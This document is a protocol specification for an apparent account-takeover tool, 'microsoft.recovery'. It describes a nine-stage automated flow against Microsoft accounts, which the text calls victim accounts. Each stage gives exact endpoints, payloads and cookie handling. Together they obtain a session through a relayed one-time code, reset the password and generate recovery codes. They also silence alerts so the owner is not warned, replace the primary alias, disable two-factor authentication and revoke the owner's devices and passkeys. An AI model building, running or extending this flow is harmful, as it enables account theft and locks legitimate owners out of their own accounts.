# 01_scraping_chain.md — 9-Stage Scraping Chain Protocol Specification

## 1. Executive Summary & Flow Mechanics

The Microsoft Account Recovery protocol implemented in `microsoft.recovery` executes a sequential 9-stage automated lifecycle designed to discover credentials, establish an authenticated session, elevate to Strong Authentication (`SA_20MIN`), generate recovery credentials, overwrite passwords, suppress alert notifications, rotate the primary sign-in alias, and revoke active sessions and passkeys.

The entire workflow executes across two distinct Microsoft domains:
1. `login.live.com` (Stages 1 through 3): Discovery, credential inspection, OTP dispatch, session establishment, and initial elevation request.
2. `account.live.com` (Stages 3 through 9): Strong Authentication session consumption, proofs management, recovery code generation, password reset, notification suppression, alias manipulation, and security cleanup.

### Cross-Stage Token & Cookie Dependency Graph

```
[Stage 1: Discovery]
   │  Output: initialPpft (PPFT), uaid, MSPOK, MSPRequ, proofId, proofChannel
   ▼
[Stage 2: OTP Dispatch & Session Establishment]
   │  Input:  initialPpft, proofId, proofChannel, user OTP
   │  Output: postPpft (FlowToken), __Host-MSAAUTH (master cookie), synchronized uaid
   ▼
[Stage 3: Session Polish / Elevation]
   │  Input:  __Host-MSAAUTH, uaid
   │  Output: AMRPSSecAuth, amsc (Strong Auth cookies on account.live.com)
   ▼
[Stage 4: Proofs Enumeration]
   │  Input:  __Host-MSAAUTH, AMRPSSecAuth, amsc
   │  Output: encryptedNetId (~132 chars), apiCanary (~261 chars), emailProofs, smsProofs, passKeyIds
   ▼
[Stage 5: Recovery Code Generation]
   │  Input:  encryptedNetId, apiCanary, cookies
   │  Output: initialRecoveryCode (25-char alphanumeric), rotated apiCanary
   ▼
[Stage 6: Password Reset & Override]
   │  Input:  initialRecoveryCode, newPassword, email, cookies
   │  Output: sRecoveryToken (~562 chars), verificationGrantToken (~6514 chars), finalRecoveryCode, rotated apiCanary
   ▼
[Stage 7: Notification Suppression (Fail-Closed)]
   │  Input:  emailProofs, smsProofs, apiCanary, uaid, cookies
   │  Output: All notification alerts disabled; rotated apiCanary
   ▼
[Stage 8: Primary Alias Rotation]
   │  Input:  newAlias, apiCanary, uaid (Cookie ONLY), cookies
   │  Output: New alias added, verified (worker OTC or manual), made primary, old alias removed
   ▼
[Stage 9: Security Cleanup & Revocation]
   │  Input:  passKeyIds, apiCanary, uaid, cookies
   │  Output: 2FA disabled, devices revoked, app passwords deleted, passkeys removed
```

---

## 2. Stage-by-Stage Technical Specification

---

### Stage 1: Credential Discovery
- **Execution Class:** `microsoft.recovery.stages.Stage1Discovery`
- **Key / Enum:** `1` / `RecoveryStage.CREDENTIAL_DISCOVERY`
- **Core Purpose:** Harvests initial session cookies, extracts the flow token (`PPFT`), and discovers the victim account's registered authentication proofs (masked email addresses and phone numbers).

#### Step 1.1: Fetch Login Page
- **HTTP Method & URL:** `GET https://login.live.com/login.srf`
- **Headers:**
  - `User-Agent`: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
  - `Accept`: `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8`
  - `Accept-Language`: `en-US,en;q=0.9`
- **Response Handling:**
  - HTTP 200 HTML document.
  - Microsoft sets cookies in `Set-Cookie`: `uaid=<32_hex_chars>; Domain=login.live.com; Path=/`, `MSPOK`, `MSPRequ`.
  - Extracted Value: `initialPpft`.
    - Primary extraction logic (`RecoveryParsers.extractPpft`): Jsoup parses `<script>` containing `var ServerData = {...}`. Reads JSON property `sFTAg`, and extracts `value` attribute from the embedded `<input type="hidden" name="PPFT" value="...">` tag.
    - Fallback regex: `name=\\?"PPFT\\?"[^>]*value=\\?"([^"\\]+)`.

#### Step 1.2: Check Credential Type & Proofs
- **HTTP Method & URL:** `POST https://login.live.com/GetCredentialType.srf`
- **Headers:**
  - `Content-Type`: `application/json; charset=UTF-8`
  - `Referer`: `https://login.live.com/login.srf`
  - Ambient cookies from Step 1.1 (`uaid`, `MSPOK`, `MSPRequ`).
- **Request JSON (`GetCredentialTypeRequest`):**
  ```json
  {
    "username": "<target_account_email>",
    "flowToken": "<initialPpft>",
    "isUcuxLoginForm": true,
    "isCookieBannerShown": false,
    "checkPhones": true
  }
  ```
- **Response JSON Parsing (`GetCredentialTypeResponse`):**
  - Evaluates `IfExistsResult`:
    - `0`: Valid existing account. Continues execution.
    - `1`: Account does not exist. Aborts immediately with `RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, "Account does not exist (IfExistsResult=1)", "1")`.
    - `5`: Account or IP is throttled, or an interactive Arkose Labs FunCaptcha is required. Aborts immediately with `RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, "Account is throttled or captcha blocked (IfExistsResult=5)", "5")`.
    - Any other integer: Unexpected status code, fails stage.
  - Inspects `Credentials.OtcLoginEligibleProofs`: Array of proof objects containing:
    - `data`: Obfuscated proof identifier (e.g. `ab***@outlook.com` or `**34`).
    - `display`: Human-readable masked string.
    - `type`: Integer proof type (`1` = Email, `2` = SMS/Phone).
- **Mutations on `RecoveryContext`:**
  - `context.initialPpft = initialPpft`
  - `context.proofId = primaryProof.data`
  - `context.proofChannel = if (primaryProof.type == 2) "SMS" else "Email"`
  - `context.proofDisplay = primaryProof.display`

---

### Stage 2: OTP Dispatch & Session Establishment
- **Execution Class:** `microsoft.recovery.stages.Stage2Otp`
- **Key / Enum:** `2` (2a Dispatch), `2b` (2b Submit) / `RecoveryStage.OTP_DISPATCH`, `RecoveryStage.OTP_SUBMIT`
- **Core Purpose:** Triggers the dispatch of a 6-digit One-Time Code to the selected proof, receives user submission via Discord UI, authenticates the OTC, and captures the master session cookie `__Host-MSAAUTH`.

#### Step 2.1: Request One-Time Code Dispatch (2a)
- **HTTP Method & URL:** `POST https://login.live.com/GetOneTimeCode.srf`
- **Headers:**
  - `Content-Type`: `application/x-www-form-urlencoded`
  - `Referer`: `https://login.live.com/login.srf`
  - Ambient cookies (`uaid`, `MSPOK`, `MSPRequ`).
- **Form Body Payload:**
  ```http
  login=<target_account_email>&flowtoken=<initialPpft>&purpose=eOTT_OtcLogin&channel=<proofChannel>&AltEmailE=<proofId>
  ```
  *(Note: If `proofChannel == "SMS"`, `AltEmailE` carries the phone proof identifier).*
- **Response JSON (`GetOneTimeCodeResponse`):**
  ```json
  {
    "State": 201,
    "FlowToken": "<postPpft_flow_token>",
    "Error": null
  }
  ```
- **Soft Rate Limiting (`State: 201/206`) Handling:**
  - Microsoft returns `State: 201` (rapid dispatch throttle) or `State: 206` (temporary cooldown on proof).
  - **Critical Invariant:** If `FlowToken` is present and non-blank, **do NOT throw an exception**. Microsoft still processed the request and issued a valid continuation flow token. Log a warning and proceed with `postPpft = FlowToken`. If `FlowToken` is missing or blank, abort stage.

#### Step 2.2: Submit OTP & Establish Session (2b)
- **User Interaction:**
  - Invokes `context.otpProvider(proofDisplay)` (a `CompletableDeferred<String>` suspended in `RecoveryInteractionEvent` awaiting modal input, with a 120-second timeout).
- **HTTP Method & URL:** `POST https://login.live.com/ppsecure/post.srf`
- **Headers:**
  - `Content-Type`: `application/x-www-form-urlencoded`
  - `Referer`: `https://login.live.com/login.srf`
  - Ambient cookies.
- **Form Body Payload:**
  ```http
  login=<target_account_email>&loginfmt=<target_account_email>&type=27&SentProofIDE=<proofId>&otc=<user_entered_otp>&PPFT=<postPpft>&LoginOptions=3
  ```
- **Response Handling:**
  - HTTP 302 Redirect (or HTTP 200).
  - **Cookie Extraction:** Captures `Set-Cookie: __Host-MSAAUTH=<msaauth_token>; path=/; Secure; HttpOnly`.
  - If `__Host-MSAAUTH` is absent from both response headers and cookie jar, stage fails immediately.
- **Cross-Domain Partitioning Bridge (Crucial Fix):**
  - Per RFC 6265bis, `__Host-` prefixed cookies are host-bound (cannot specify a wildcard domain). Ktor's `AcceptAllCookiesStorage` scopes cookies strictly by URL host.
  - To prevent requests targeting `account.live.com` (Stages 4 through 9) from dropping `__Host-MSAAUTH`, `Stage2Otp.kt` explicitly replicates the cookie:
    ```kotlin
    context.cookieStorage.addCookie(
        Url("https://login.live.com"),
        Cookie(name = "__Host-MSAAUTH", value = msaAuthCookie.value, domain = "login.live.com", path = "/", secure = true)
    )
    context.cookieStorage.addCookie(
        Url("https://account.live.com"),
        Cookie(name = "__Host-MSAAUTH", value = msaAuthCookie.value, domain = "account.live.com", path = "/", secure = true)
    )
    ```
- **UAID Synchronization:**
  - Reads the actual server `uaid` cookie returned by `login.live.com` and updates `context.uaid = storedUaid`.

---

### Stage 3: Session Polish & Strong Authentication Elevation
- **Execution Class:** `microsoft.recovery.stages.Stage3Polish`
- **Key / Enum:** `3` / `RecoveryStage.SESSION_POLISH`
- **Core Purpose:** Elevates the primary session (`__Host-MSAAUTH`) to Strong Authentication (`SA_20MIN`) under `account.live.com`, capturing the essential authorization cookies `AMRPSSecAuth` and `amsc`.

#### Step 3.1: Stabilization Request
- **HTTP Method & URL:**
  ```http
  GET https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=21&rver=7.5.2156.0&wp=SA_20MIN&wreply=https://account.live.com/proofs/Add?apt=2&uaid=<currentUaid>&lc=1033&id=38936&mkt=en-US
  ```
- **Client Configuration:** Dedicated `isolatedClient` configured with `HttpCookies` bound to `context.cookieStorage` and `followRedirects = true`.
- **Headers:**
  - `Cookie: __Host-MSAAUTH=<msaauth>; uaid=<currentUaid>`
  - Standard Chrome browser headers (`Sec-Ch-Ua`, `Sec-Ch-Ua-Mobile: ?0`, `Sec-Fetch-Dest: document`, `Sec-Fetch-Mode: navigate`, `Sec-Fetch-Site: same-origin`, `Sec-Fetch-User: ?1`).
- **Interstitials & Edge Case Detection:**
  - If HTML contains `<input type="hidden" name="PPFT">`: Session expired or invalid; Microsoft demands re-authentication. Aborts stage.
  - If HTML contains "Protect your account" or "Verify your identity": Interactive interstitial challenge (Arkose captcha or unbypassed 2FA challenge). Aborts stage.

#### Step 3.2: Auto-Submit Form (`DoSubmit()`) Handling & Token `t` Extraction
Microsoft login pages frequently render an auto-submitting HTML form (`body[onload*=DoSubmit]`, `<form name="fmHF" ...>`).
`Stage3Parser` inspects the DOM:
1. **Branch A: `DoSubmit()` Form Detected:**
   - Jsoup extracts the form's `action` URL and all hidden input fields (`<input type="hidden">`).
   - If `actionUrl` points to `/proofs/Add`: Submits immediately to Step 3.3.
   - If `actionUrl` points to an intermediate redirection hop (e.g. `login.live.com/ppsecure/post.srf`): Posts the hidden fields with ambient cookies and follows up to 2 hops until reaching `/proofs/Add` or obtaining token `t`.
2. **Branch B: Direct Token `t` Extraction:**
   - If no auto-submit form exists, parses `<input type="hidden" name="t" value="...">` (token `t`, length ~1024 characters).
   - Fallback regex: `name=\\?"t\\?"[^>]*value=\\?"([^"\\]+)`.

#### Step 3.3: Submit Token `t` to `proofs/Add`
- **HTTP Method & URL:** `POST https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0`
- **Client Configuration:** Dedicated `noRedirectPostClient` (`followRedirects = false`) equipped with `HttpCookies` bound to `context.cookieStorage`.
- **Headers:** `Content-Type: application/x-www-form-urlencoded`, ambient cookies (`__Host-MSAAUTH`, `uaid`).
- **Form Body Payload:** `t=<token_t>`
- **Response Handling:**
  - Returns HTTP 302 Redirect to `/proofs/manage/additional`.
  - Captures `Set-Cookie` headers:
    - `AMRPSSecAuth=<amrp_token>; path=/; domain=account.live.com; Secure; HttpOnly`
    - `amsc=<amsc_token>; path=/; domain=account.live.com; Secure; HttpOnly`
  - Explicitly commits both cookies into `context.cookieStorage` under `Url("https://account.live.com")`.
  - Emits debug context (`3-debug`) for diagnostic buffering in case of subsequent failures.

---

### Stage 4: Proofs Enumeration
- **Execution Class:** `microsoft.recovery.stages.Stage4Proofs`
- **Key / Enum:** `4` / `RecoveryStage.PROOFS_ENUMERATION`
- **Core Purpose:** Harvests registered authentication proofs, cryptographic NetID, and CSRF canary from the account management portal.

- **HTTP Method & URL:** `GET https://account.live.com/proofs/manage/additional`
- **Headers:**
  - `Accept`: `text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`
  - `X-Requested-With`: `XMLHttpRequest`
  - Ambient cookies: `AMRPSSecAuth`, `amsc`, `__Host-MSAAUTH`.
- **Response Parsing (`RecoveryParsers.extractManageProofsData`):**
  - Parses ~230KB HTML document containing embedded JSON variables: `var t0 = {...}` or `var ServerData = {...}`.
  - Extracts properties:
    - `encryptedNetId`: Cryptographic identifier (length ~132 characters).
    - `apiCanary`: CSRF canary token (length ~261 characters).
    - `emailProofs`: Registered email proofs (`[{name, notificationEnabled, type: 1}]`).
    - `smsProofs`: Registered phone/SMS proofs (`[{name, notificationEnabled, type: 2}]`).
    - `passKeys`: Registered FIDO2/WebAuthn passkey IDs.
- **Mandatory Unicode Decoding Invariant:**
  - Extracted fields in Microsoft HTML are encoded with JSON Unicode escapes (e.g. `\u002b` for `+`, `\u003a` for `:`, `\u003d` for `=`).
  - `RecoveryParsers.unescapeUnicode()` transforms all escape sequences to standard characters prior to API submission. Unescaped tokens cause Microsoft REST APIs to return HTTP 500 Internal Server Error.
- **Mutations on `RecoveryContext`:**
  - `context.proofsData = ManageProofsData(...)`
  - `context.activeCanary = proofsData.apiCanary`

---

### Stage 5: Emergency Recovery Code Generation
- **Execution Class:** `microsoft.recovery.stages.Stage5RecoveryCode`
- **Key / Enum:** `5` / `RecoveryStage.RECOVERY_CODE_GEN`
- **Core Purpose:** Generates an initial 25-character cryptographic recovery code and performs the first API canary rotation.

- **HTTP Method & URL:** `POST https://account.live.com/API/Proofs/GenerateRecoveryCode`
- **Headers:**
  - `Content-Type`: `application/json; charset=UTF-8`
  - `canary`: `<context.activeCanary>`
  - `x-ms-apiVersion`: `2`
  - `x-ms-apiTransport`: `xhr`
  - Ambient cookies (`AMRPSSecAuth`, `amsc`, `__Host-MSAAUTH`).
- **Request JSON (`GenerateRecoveryCodeRequest`):**
  ```json
  {
    "encryptedNetId": "<encryptedNetId>"
  }
  ```
- **Response JSON (`GenerateRecoveryCodeResponse`):**
  ```json
  {
    "recoveryCode": "ABCDE-FGHIJ-KLMNO-PQRST-UVWXY",
    "apiCanary": "<new_rotated_canary>",
    "error": null
  }
  ```
- **Validation & Mutations:**
  - Verifies `recoveryCode` is non-blank and matches the 25-character 5x5 alphanumeric format.
  - `context.initialRecoveryCode = response.recoveryCode`
  - `context.activeCanary = response.apiCanary` (rotates active canary).

---

### Stage 6: Password Reset & Credential Override
- **Execution Class:** `microsoft.recovery.stages.Stage6PasswordReset`
- **Key / Enum:** `6` / `RecoveryStage.PASSWORD_RESET`
- **Core Purpose:** Consumes the initial recovery code to bypass current credentials, overrides the account password, sets a contact email, invalidates the old recovery code, and acquires the final emergency recovery code.

#### Step 6.1: Load Password Reset Page
- **HTTP Method & URL:**
  ```http
  GET https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=<target_account_email>
  ```
- **Headers:** Ambient cookies.
- **Extraction (`RecoveryParsers.extractResetPasswordData`):**
  - Jsoup parses `var ServerData = {...}` script block.
  - Extracts `sRecoveryToken` (length ~562 characters) and reset-specific `apiCanary`.

#### Step 6.2: Verify Recovery Code
- **HTTP Method & URL:** `POST https://account.live.com/API/Recovery/VerifyRecoveryCode`
- **Headers:**
  - `Content-Type`: `application/json; charset=UTF-8`
  - `canary`: `<resetData.apiCanary>`
  - Ambient cookies.
- **Request JSON (`VerifyRecoveryCodeRequest`):**
  ```json
  {
    "publicKey": "2CBB3761027476727BDDBC9DE02870BE01ED793A",
    "recoveryCode": "<initialRecoveryCode>",
    "code": "<initialRecoveryCode>",
    "scid": 100103,
    "token": "<sRecoveryToken>",
    "uiflvr": 1001
  }
  ```
- **Response JSON (`VerifyRecoveryCodeResponse`):**
  ```json
  {
    "token": "<verification_grant_token_len_6514>",
    "apiCanary": "<canaryAfterVerify>",
    "error": null
  }
  ```
- **Validation Invariant:** The returned `verificationGrantToken` must be non-blank and must differ from `sRecoveryToken`.

#### Step 6.3: Overwrite Credentials (`RecoverUser`)
- **HTTP Method & URL:** `POST https://account.live.com/API/Recovery/RecoverUser`
- **Headers:**
  - `Content-Type`: `application/json; charset=UTF-8`
  - `canary`: `<canaryAfterVerify>`
  - Ambient cookies.
- **Request JSON (`RecoverUserRequest`):**
  ```json
  {
    "contactEmail": "<contactEmailForReset>",
    "contactEpid": "",
    "password": "<newPassword>",
    "passwordExpiryEnabled": 0,
    "publicKey": "2CBB3761027476727BDDBC9DE02870BE01ED793A",
    "token": "<verificationGrantToken>"
  }
  ```
  *(Note: `contactEmailForReset` defaults to empty string `""` or `newEmail` if verified, avoiding risk verification challenges).*
- **Response JSON (`RecoverUserResponse`):**
  ```json
  {
    "recoveryCode": "12345-67890-ABCDE-FGHIJ-KLMNO",
    "apiCanary": "<canaryAfterRecover>",
    "enableTfa": false,
    "error": null
  }
  ```
- **Validation & Error Handling:**
  - Microsoft Error Codes:
    - `1218`: New password matches existing password. Marks FAILED in DB.
    - `6001`: Account has active 2FA preventing recovery code reset. Marks FAILED in DB.
    - `1247`: Password complexity or IP throttling error. Marks FAILED in DB.
  - Final recovery code must be non-blank and must differ from `initialRecoveryCode`.
- **Mutations on `RecoveryContext`:**
  - `context.finalRecoveryCode = response.recoveryCode`
  - `context.activeCanary = response.apiCanary`

---

### Stage 7: Notification Suppression (Fail-Closed)
- **Execution Class:** `microsoft.recovery.stages.Stage7Suppression`
- **Key / Enum:** `7` / `RecoveryStage.NOTIFICATION_SUPPRESSION`
- **Core Purpose:** Sequentially disables email and SMS alert notifications across all registered proofs to prevent Microsoft from warning the original owner.

#### Step 7.1: Refresh Proofs & Canary
- Calls `GET https://account.live.com/proofs/manage/additional` to obtain a fresh list of registered proofs and an up-to-date canary.

#### Step 7.2: Sequential Suppression Loop
- Iterates over all proofs in `emailProofs + smsProofs` strictly one at a time (with optional `stageDelayMs` sleep):
- **HTTP Method & URL:** `POST https://account.live.com/API/Proofs/SetUserNotificationState`
- **Headers:**
  - `Content-Type`: `application/json; charset=UTF-8`
  - `canary`: `<activeCanary>`
  - Ambient cookies.
- **Request JSON (`SetUserNotificationStateRequest`):**
  ```json
  {
    "proofDetails": [
      {
        "name": "<proof.name>",
        "notificationEnabled": false,
        "type": "<proof.type>"
      }
    ],
    "uiflvr": 1001,
    "uaid": "<context.uaid>",
    "scid": 100109,
    "hpgid": 201030
  }
  ```
- **Response JSON (`GenericCanaryResponse`):** Returns rotated `apiCanary`.
- **Fail-Closed Invariant:**
  - If any suppression request returns non-2xx status, redirects away from the endpoint (e.g. to `login.srf`), or returns a blank canary, **the entire recovery workflow halts immediately**. Suppressing notifications is critical; partial failure is treated as fatal.
- **Mutations on `RecoveryContext`:**
  - `context.suppressedCount = suppressedCount`
  - `context.activeCanary = updatedCanary`

---

### Stage 8: Primary Alias Rotation
- **Execution Class:** `microsoft.recovery.stages.Stage8Alias` (and `AliasClient`)
- **Key / Enum:** `8` / `RecoveryStage.ALIAS_ROTATION`
- **Core Purpose:** Adds a new alias identifier, verifies OTC (if required), elevates the new alias to primary, and permanently deletes the compromised original alias.

#### Mode A: Native Outlook Alias Mode (`aliasClient == null`)
- **Step 8.1: Add Alias**
  - **HTTP Method & URL:** `POST https://account.live.com/AddAssocId`
  - **Client Configuration:** Dedicated `noRedirectClient` (`followRedirects = false`) equipped with `HttpCookies` containing full ambient cookie jar (`__Host-MSAAUTH`, `AMRPSSecAuth`, `amsc`, `uaid`, `MSPOK`, `MSPRequ`).
  - **CRITICAL UAID INVARIANT:** `uaid` is transmitted exclusively in the `Cookie` header and **NEVER** in the form body. (Injecting `uaid` into the form body triggers Microsoft WAF to redirect to `login.microsoftonline.com`).
  - **Form Body Payload:**
    ```http
    canary=<activeCanary>&PostOption=NONE&SingleDomain=outlook.com&UpSell=&AddAssocIdOptions=LIVE&AssociatedIdLive=<newAliasPrefix>
    ```
  - **Response Handling:**
    - Expects HTTP 302 Redirect.
    - If redirected to `login.microsoftonline.com`, throws `SessionExpiredException`.
    - Persists response `Set-Cookie` headers into `cookieStorage`.
    - Native Outlook aliases require **zero email OTC verification**.
- **Step 8.2: Promote to Primary Alias**
  - **HTTP Method & URL:** `POST https://account.live.com/API/MakePrimary`
  - **Headers:** `Content-Type: application/json; charset=UTF-8`, `canary: `<activeCanary>`.
  - **Request JSON (`MakePrimaryRequest`):**
    ```json
    {
      "aliasName": "<targetAliasEmail>",
      "emailChecked": true,
      "removeOldPrimary": false,
      "uiflvr": 1001,
      "uaid": "<context.uaid>",
      "scid": 100115,
      "hpgid": 200650
    }
    ```
  - **Response:** Rotates `activeCanary`. Error `1282` indicates primary alias change quota reached (limit 2 per week).
- **Step 8.3: Remove Old Alias**
  - **HTTP Method & URL:** `POST https://account.live.com/names/manage`
  - **Headers:** `Content-Type: application/x-www-form-urlencoded`.
  - **Form Body Payload:**
    ```http
    canary=<activeCanary>&action=RemoveAlias&aliasName=<originalEmail>&displayName=<originalEmail>
    ```
  - **Validation:** Response HTML must contain confirmation string `"Note_AssociatedIdRemoved"`.

#### Mode B: Custom Domain Alias Mode (`aliasClient != null`)
- Submits `AddAssocId` with custom domain (e.g. `@qhuyy.tech`).
- Awaits 6-digit OTC:
  - If `aliasOtcProvider` provided (Discord UI modal), prompts user via Discord.
  - Else, polls Cloudflare Worker (`GET $workerBaseUrl/get-otc`) with HMAC-SHA256 signature (`$alias:$timestamp`).
- Submits verification: `GET https://account.live.com/Aliases/Verify?aliasname=<alias>&aliastype=Email&otc=<otc>`.
- Executes `MakePrimary` and `RemoveAlias`.

---

### Stage 9: Security Cleanup & Session Revocation
- **Execution Class:** `microsoft.recovery.stages.Stage9Cleanup`
- **Key / Enum:** `9` / `RecoveryStage.SECURITY_CLEANUP`
- **Core Purpose:** Revokes all active user sessions across all devices, deletes app passwords, removes WebAuthn passkeys, and disables legacy two-factor authentication.

#### Endpoints Executed in Linear Sequence:
1. **Disable Two-Factor Authentication:**
   - `POST https://account.live.com/API/Proofs/DisableTfa`
2. **Revoke Active Devices & Refresh Tokens:**
   - `POST https://account.live.com/API/Proofs/DeleteDevices`
3. **Delete Application-Specific Passwords:**
   - `POST https://account.live.com/API/Proofs/DeleteAppPassword`
4. **Remove Registered Passkeys (Loop per passkey):**
   - `POST https://account.live.com/API/Proofs/RemovePasskey`

#### Headers & Payload Specification:
- **Headers:**
  - `Content-Type`: `application/json; charset=UTF-8`
  - `canary`: `<activeCanary>`
  - `X-Requested-With`: `XMLHttpRequest`
  - Ambient cookies (`AMRPSSecAuth`, `amsc`, `__Host-MSAAUTH`).
- **Request JSON (`SecurityCleanupRequest`):**
  ```json
  {
    "uiflvr": 1001,
    "uaid": "<context.uaid>",
    "scid": 100109,
    "hpgid": 201030
  }
  ```
  *(For `RemovePasskey`, payload includes `"passKeyId": "<id>"`. Crucial: `passKeyId` must be omitted via `@EncodeDefault(NEVER)` on the first three endpoints to avoid Microsoft schema rejections).*
- **Error Handling Strategy:** Best-effort cleanup. Individual failures are logged as warnings, allowing remaining endpoints to execute. Stage completes successfully once session revocation is finalized.

---

## 3. Comprehensive Protocol Reference Table

| Stage | Name | Target Endpoint | HTTP Method | Critical Tokens / Cookies Consumed | Tokens / Cookies Produced | Error / Exit Conditions |
|---|---|---|---|---|---|---|
| **1a** | Initial Scrape | `/login.srf` | GET | None | `initialPpft`, `uaid`, `MSPOK`, `MSPRequ` | Missing PPFT or HTTP non-200 |
| **1b** | Credential Check | `/GetCredentialType.srf` | POST | `initialPpft`, `uaid` | `proofId`, `proofChannel`, `proofDisplay` | `IfExistsResult=1` (not found), `IfExistsResult=5` (throttled) |
| **2a** | OTP Dispatch | `/GetOneTimeCode.srf` | POST | `initialPpft`, `proofId`, `proofChannel` | `postPpft` (FlowToken) | Empty FlowToken; State 201/206 logged as warning |
| **2b** | OTP Submit | `/ppsecure/post.srf` | POST | `postPpft`, `proofId`, user OTC | `__Host-MSAAUTH`, synchronized `uaid` | Missing `__Host-MSAAUTH` cookie |
| **3a** | Polish Stabilize | `/login.srf?wp=SA_20MIN` | GET | `__Host-MSAAUTH`, `uaid` | Intermediate cookies, `DoSubmit` form / token `t` | Session expired (PPFT in HTML), Protect/Verify interstitial |
| **3b** | Submit Token `t` | `/proofs/Add?apt=2` | POST | token `t`, `__Host-MSAAUTH` | `AMRPSSecAuth`, `amsc` | Non-302 response, missing Strong Auth cookies |
| **4** | Enumerate Proofs | `/proofs/manage/additional` | GET | `AMRPSSecAuth`, `amsc`, `__Host-MSAAUTH` | `encryptedNetId`, `apiCanary`, proofs, passkeys | Missing NetID or canary, 302 redirect to login |
| **5** | Gen Recovery Code | `/API/Proofs/GenerateRecoveryCode` | POST | `encryptedNetId`, `apiCanary`, cookies | `initialRecoveryCode`, rotated `apiCanary` | Empty recovery code or API error |
| **6a** | Scrape Reset | `/ResetPassword.aspx` | GET | Target email, cookies | `sRecoveryToken`, reset `apiCanary` | Missing recovery token or canary |
| **6b** | Verify Code | `/API/Recovery/VerifyRecoveryCode` | POST | `initialRecoveryCode`, `sRecoveryToken`, canary | `verificationGrantToken`, rotated `apiCanary` | Unchanged token, invalid recovery code |
| **6c** | Recover User | `/API/Recovery/RecoverUser` | POST | `verificationGrantToken`, `newPassword`, canary | `finalRecoveryCode`, rotated `apiCanary` | Error 1218 (same pass), 6001 (2FA), 1247 (throttled) |
| **7** | Suppress Alerts | `/API/Proofs/SetUserNotificationState`| POST | `activeCanary`, `uaid`, proof names/types | Rotated `apiCanary` | Fail-closed: ANY failure halts entire recovery flow |
| **8a** | Add Alias | `/AddAssocId` | POST | `activeCanary`, `uaid` (COOKIE ONLY) | New alias bound, redirect 302 | Redirect to `login.microsoftonline.com` (session expired) |
| **8b** | Make Primary | `/API/MakePrimary` | POST | `aliasName`, `activeCanary`, `uaid` | Rotated `apiCanary` | Error 1282 (quota limit: 2 changes per week) |
| **8c** | Delete Old Alias | `/names/manage` | POST | `originalEmail`, `activeCanary` | Removed confirmation | Missing `"Note_AssociatedIdRemoved"` string |
| **9a** | Disable 2FA | `/API/Proofs/DisableTfa` | POST | `activeCanary`, `uaid` | Rotated `apiCanary` | Best-effort; warning logged on non-200 |
| **9b** | Delete Devices | `/API/Proofs/DeleteDevices` | POST | `activeCanary`, `uaid` | Rotated `apiCanary` | Best-effort; warning logged on non-200 |
| **9c** | Delete App Pass | `/API/Proofs/DeleteAppPassword` | POST | `activeCanary`, `uaid` | Rotated `apiCanary` | Best-effort; warning logged on non-200 |
| **9d** | Remove Passkey | `/API/Proofs/RemovePasskey` | POST | `passKeyId`, `activeCanary`, `uaid` | Rotated `apiCanary` | Best-effort; warning logged on non-200 |
